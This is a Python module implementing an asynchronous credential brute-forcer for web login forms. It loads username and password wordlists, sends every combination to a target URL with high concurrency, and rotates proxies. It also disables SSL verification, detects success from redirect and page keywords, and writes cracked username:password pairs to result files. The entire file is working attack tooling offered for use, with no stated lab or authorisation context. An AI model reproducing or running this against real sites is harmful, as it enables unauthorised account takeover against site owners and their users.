#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
🔥 ASYNC BRUTE FORCE MODULE
High-performance async brute force with rate limiting and semaphore control
"""

import asyncio
import aiohttp
import aiofiles
import time
import json
import logging
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional, Set, Union
from dataclasses import dataclass, field
from urllib.parse import urlparse

# Rich progress bar
try:
    from rich.progress import (
        Progress, BarColumn, TextColumn,
        TimeElapsedColumn, TimeRemainingColumn, SpinnerColumn
    )
    from rich.console import Console
    RICH_AVAILABLE = True
except ImportError:
    RICH_AVAILABLE = False

console = Console() if RICH_AVAILABLE else None


@dataclass
class BruteForceConfig:
    """⚙️ Brute force configuration"""
    max_concurrent: int = 50
    rate_limit_per_second: float = 10.0
    timeout: float = 30.0
    max_retries: int = 3
    retry_delay: float = 1.0
    user_agent: str = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
    proxy_rotation: bool = True
    success_codes: Set[int] = field(default_factory=lambda: {200, 302, 301})
    fail_fast: bool = False
    save_attempts: bool = True
    output_dir: Path = Path("brute_results")


@dataclass
class BruteResult:
    """📊 Brute force attempt result"""
    username: str
    password: str
    target: str
    success: bool
    status_code: int
    response_time: float
    timestamp: datetime
    error_message: str = ""
    response_headers: Dict[str, str] = field(default_factory=dict)
    response_size: int = 0


@dataclass
class BruteStats:
    """📈 Brute force statistics"""
    start_time: datetime
    end_time: Optional[datetime] = None
    total_attempts: int = 0
    successful_attempts: int = 0
    failed_attempts: int = 0
    errors: int = 0
    average_response_time: float = 0.0
    success_rate: float = 0.0
    requests_per_second: float = 0.0


class AsyncBruteForcer:
    """🚀 High-performance async brute forcer"""

    def __init__(self, config: Optional[BruteForceConfig] = None):
        self.config = config or BruteForceConfig()
        self.session: Optional[aiohttp.ClientSession] = None
        self.semaphore = asyncio.Semaphore(self.config.max_concurrent)
        self.rate_limiter = asyncio.Semaphore(
            int(self.config.rate_limit_per_second)
        )
        self.stats = BruteStats(start_time=datetime.now())
        self.successful_creds: List[BruteResult] = []
        self.all_results: List[BruteResult] = []
        self.proxies: List[str] = []
        self.proxy_index = 0

        # Ensure output directory
        self.config.output_dir.mkdir(exist_ok=True)

    async def __aenter__(self):
        """Async context manager entry"""
        await self.start_session()
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        """Async context manager exit"""
        await self.close_session()

    async def start_session(self):
        """Initialize aiohttp session"""
        connector = aiohttp.TCPConnector(
            limit=self.config.max_concurrent * 2,
            limit_per_host=self.config.max_concurrent,
            ttl_dns_cache=300,
            use_dns_cache=True
        )

        timeout = aiohttp.ClientTimeout(total=self.config.timeout)

        headers = {
            'User-Agent': self.config.user_agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
        }

        self.session = aiohttp.ClientSession(
            connector=connector,
            timeout=timeout,
            headers=headers
        )

    async def close_session(self):
        """Close aiohttp session"""
        if self.session:
            await self.session.close()

    def load_proxies(self, proxy_file: Path) -> int:
        """Load proxy list from file"""
        try:
            with open(proxy_file, 'r') as f:
                self.proxies = [
                    line.strip() for line in f
                    if line.strip() and not line.startswith('#')
                ]
            logging.info(f"Loaded {len(self.proxies)} proxies")
            return len(self.proxies)
        except Exception as e:
            logging.error(f"Failed to load proxies: {e}")
            return 0

    def get_next_proxy(self) -> Optional[str]:
        """Get next proxy in rotation"""
        if not self.proxies:
            return None

        proxy = self.proxies[self.proxy_index]
        self.proxy_index = (self.proxy_index + 1) % len(self.proxies)
        return proxy

    async def attempt_login(
        self,
        target_url: str,
        username: str,
        password: str,
        login_data: Optional[Dict[str, str]] = None,
        method: str = "POST"
    ) -> BruteResult:
        """Single login attempt with rate limiting"""

        start_time = time.time()
        result = BruteResult(
            username=username,
            password=password,
            target=target_url,
            success=False,
            status_code=0,
            response_time=0.0,
            timestamp=datetime.now()
        )

        async with self.semaphore:  # Limit concurrent requests
            async with self.rate_limiter:  # Rate limiting
                try:
                    # Rate limiting delay
                    await asyncio.sleep(1.0 / self.config.rate_limit_per_second)

                    # Prepare request data
                    if login_data is None:
                        login_data = {
                            'username': username,
                            'password': password
                        }
                    else:
                        # Replace placeholders
                        login_data = {
                            k: v.replace('{username}', username).replace(
                                '{password}', password)
                            for k, v in login_data.items()
                        }

                    # Get proxy
                    proxy = None
                    if self.config.proxy_rotation:
                        proxy = self.get_next_proxy()

                    # Make request
                    request_kwargs = {
                        'url': target_url,
                        'proxy': proxy,
                        'ssl': False,
                        'allow_redirects': False
                    }

                    if method.upper() == "POST":
                        request_kwargs['data'] = login_data
                        async with self.session.post(**request_kwargs) as response:
                            await self._process_response(response, result)
                    else:
                        request_kwargs['params'] = login_data
                        async with self.session.get(**request_kwargs) as response:
                            await self._process_response(response, result)

                    result.response_time = time.time() - start_time

                    # Check if successful
                    if result.status_code in self.config.success_codes:
                        # Additional success checks
                        result.success = await self._check_success_indicators(
                            response, username, password
                        )

                except asyncio.TimeoutError:
                    result.error_message = "Request timeout"
                    result.response_time = time.time() - start_time

                except Exception as e:
                    result.error_message = str(e)
                    result.response_time = time.time() - start_time
                    logging.debug(f"Login attempt failed: {e}")

        return result

    async def _process_response(
        self,
        response: aiohttp.ClientResponse,
        result: BruteResult
    ) -> None:
        """Process HTTP response"""
        result.status_code = response.status
        result.response_headers = dict(response.headers)

        # Read response content (limited)
        try:
            content = await response.read()
            result.response_size = len(content)
        except Exception as e:
            logging.debug(f"Failed to read response: {e}")

    async def _check_success_indicators(
        self,
        response: aiohttp.ClientResponse,
        username: str,
        password: str
    ) -> bool:
        """Check for additional success indicators"""

        # Check for redirect to dashboard/home
        if response.status in [301, 302]:
            location = response.headers.get('Location', '')
            success_indicators = [
                'dashboard', 'home', 'profile', 'account',
                'welcome', 'main', 'index'
            ]
            if any(indicator in location.lower() for indicator in success_indicators):
                return True

        # Check response content for success indicators
        try:
            content = await response.text()
            content_lower = content.lower()

            # Success indicators
            success_patterns = [
                'welcome', 'dashboard', 'logout', 'profile',
                'successfully logged in', 'login successful'
            ]

            # Failure indicators
            failure_patterns = [
                'invalid', 'incorrect', 'wrong', 'failed',
                'error', 'denied', 'unauthorized'
            ]

            has_success = any(
                pattern in content_lower for pattern in success_patterns)
            has_failure = any(
                pattern in content_lower for pattern in failure_patterns)

            return has_success and not has_failure

        except Exception:
            return False

    async def brute_force_async(
        self,
        target_url: str,
        usernames: List[str],
        passwords: List[str],
        login_data: Optional[Dict[str, str]] = None,
        method: str = "POST"
    ) -> List[BruteResult]:
        """Async brute force attack"""

        self.stats = BruteStats(start_time=datetime.now())
        self.successful_creds.clear()
        self.all_results.clear()

        logging.info(f"Starting brute force on {target_url}")
        logging.info(
            f"Usernames: {len(usernames)}, Passwords: {len(passwords)}")
        logging.info(f"Total combinations: {len(usernames) * len(passwords)}")

        # Create all combinations
        combinations = [
            (username, password)
            for username in usernames
            for password in passwords
        ]

        total_combinations = len(combinations)
        self.stats.total_attempts = total_combinations

        # Progress tracking
        progress = None
        task_id = None

        if RICH_AVAILABLE and console:
            progress = Progress(
                SpinnerColumn(),
                TextColumn("[progress.description]{task.description}"),
                BarColumn(),
                TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
                TextColumn("({task.completed}/{task.total})"),
                TimeElapsedColumn(),
                TimeRemainingColumn(),
                console=console
            )
            progress.start()
            task_id = progress.add_task(
                f"🔥 Brute forcing {urlparse(target_url).netloc}",
                total=total_combinations
            )

        try:
            # Create async tasks
            tasks = []
            for username, password in combinations:
                task = asyncio.create_task(
                    self.attempt_login(
                        target_url, username, password, login_data, method
                    )
                )
                tasks.append(task)

            # Process results as they complete
            completed_count = 0
            for coro in asyncio.as_completed(tasks):
                result = await coro
                completed_count += 1

                # Update stats
                self.all_results.append(result)

                if result.success:
                    self.successful_creds.append(result)
                    self.stats.successful_attempts += 1

                    logging.info(
                        f"SUCCESS! {result.username}:{result.password} on {target_url}"
                    )

                    # Stop on first success if fail_fast enabled
                    if self.config.fail_fast:
                        # Cancel remaining tasks
                        for remaining_task in tasks:
                            if not remaining_task.done():
                                remaining_task.cancel()
                        break

                elif result.error_message:
                    self.stats.errors += 1
                else:
                    self.stats.failed_attempts += 1

                # Update progress
                if progress and task_id:
                    progress.update(task_id, completed=completed_count)

                # Auto-save progress periodically
                if (self.config.save_attempts and
                        completed_count % 100 == 0):
                    await self._save_progress()

        finally:
            if progress:
                progress.stop()

        # Final stats
        self.stats.end_time = datetime.now()
        duration = (self.stats.end_time -
                    self.stats.start_time).total_seconds()
        self.stats.requests_per_second = completed_count / max(duration, 1)

        if self.all_results:
            avg_time = sum(
                r.response_time for r in self.all_results) / len(self.all_results)
            self.stats.average_response_time = avg_time

        self.stats.success_rate = (
            self.stats.successful_attempts / max(completed_count, 1)
        ) * 100

        # Save final results
        if self.config.save_attempts:
            await self._save_final_results(target_url)

        return self.successful_creds

    async def _save_progress(self) -> None:
        """Save progress to file"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        progress_file = self.config.output_dir / f"progress_{timestamp}.json"

        progress_data = {
            "stats": {
                "total_attempts": self.stats.total_attempts,
                "successful_attempts": self.stats.successful_attempts,
                "failed_attempts": self.stats.failed_attempts,
                "errors": self.stats.errors,
                "success_rate": self.stats.success_rate
            },
            "successful_creds": [
                {
                    "username": result.username,
                    "password": result.password,
                    "target": result.target,
                    "timestamp": result.timestamp.isoformat()
                }
                for result in self.successful_creds
            ]
        }

        try:
            with open(progress_file, 'w') as f:
                json.dump(progress_data, f, indent=2)
        except Exception as e:
            logging.error(f"Failed to save progress: {e}")

    async def _save_final_results(self, target_url: str) -> None:
        """Save final results to files"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        base_name = urlparse(target_url).netloc.replace(':', '_')

        # Save successful credentials
        success_file = self.config.output_dir / \
            f"success_{base_name}_{timestamp}.txt"
        with open(success_file, 'w') as f:
            f.write(f"# Successful credentials for {target_url}\n")
            f.write(f"# Found on {datetime.now().isoformat()}\n\n")

            for result in self.successful_creds:
                f.write(f"{result.username}:{result.password}\n")

        # Save detailed results as JSON
        results_file = self.config.output_dir / \
            f"results_{base_name}_{timestamp}.json"
        results_data = {
            "target": target_url,
            "timestamp": datetime.now().isoformat(),
            "stats": {
                "total_attempts": self.stats.total_attempts,
                "successful_attempts": self.stats.successful_attempts,
                "failed_attempts": self.stats.failed_attempts,
                "errors": self.stats.errors,
                "success_rate": self.stats.success_rate,
                "average_response_time": self.stats.average_response_time,
                "requests_per_second": self.stats.requests_per_second
            },
            "successful_credentials": [
                {
                    "username": result.username,
                    "password": result.password,
                    "status_code": result.status_code,
                    "response_time": result.response_time,
                    "timestamp": result.timestamp.isoformat()
                }
                for result in self.successful_creds
            ]
        }

        with open(results_file, 'w') as f:
            json.dump(results_data, f, indent=2)

        logging.info(f"Results saved to {results_file}")

    def get_stats_summary(self) -> Dict[str, Union[str, int, float]]:
        """Get human-readable stats summary"""
        duration = 0
        if self.stats.end_time:
            duration = (self.stats.end_time -
                        self.stats.start_time).total_seconds()

        return {
            "duration_seconds": round(duration, 2),
            "total_attempts": self.stats.total_attempts,
            "successful_attempts": self.stats.successful_attempts,
            "failed_attempts": self.stats.failed_attempts,
            "errors": self.stats.errors,
            "success_rate_percent": round(self.stats.success_rate, 2),
            "average_response_time": round(self.stats.average_response_time, 3),
            "requests_per_second": round(self.stats.requests_per_second, 2)
        }

    async def test_target(self, target_url: str) -> Dict[str, Union[str, bool, int]]:
        """Test if target is reachable"""
        try:
            async with self.session.get(target_url, timeout=aiohttp.ClientTimeout(total=10)) as response:
                return {
                    "reachable": True,
                    "status_code": response.status,
                    "server": response.headers.get('Server', 'Unknown'),
                    "response_time": response.headers.get('X-Response-Time', 'Unknown')
                }
        except Exception as e:
            return {
                "reachable": False,
                "error": str(e),
                "status_code": 0
            }


# Utility functions
async def load_wordlist(file_path: Path) -> List[str]:
    """Load wordlist from file async"""
    try:
        async with aiofiles.open(file_path, 'r') as f:
            content = await f.read()
            return [
                line.strip() for line in content.splitlines()
                if line.strip() and not line.startswith('#')
            ]
    except Exception as e:
        logging.error(f"Failed to load wordlist {file_path}: {e}")
        return []


async def quick_brute_force(
    target_url: str,
    username_file: Path,
    password_file: Path,
    max_concurrent: int = 50,
    rate_limit: float = 10.0
) -> List[BruteResult]:
    """Quick brute force with default settings"""

    # Load wordlists
    usernames = await load_wordlist(username_file)
    passwords = await load_wordlist(password_file)

    if not usernames or not passwords:
        logging.error("Failed to load wordlists")
        return []

    # Configure brute forcer
    config = BruteForceConfig(
        max_concurrent=max_concurrent,
        rate_limit_per_second=rate_limit
    )

    # Run brute force
    async with AsyncBruteForcer(config) as bruter:
        return await bruter.brute_force_async(target_url, usernames, passwords)


# Export main components
__all__ = [
    'AsyncBruteForcer',
    'BruteForceConfig',
    'BruteResult',
    'BruteStats',
    'load_wordlist',
    'quick_brute_force'
]
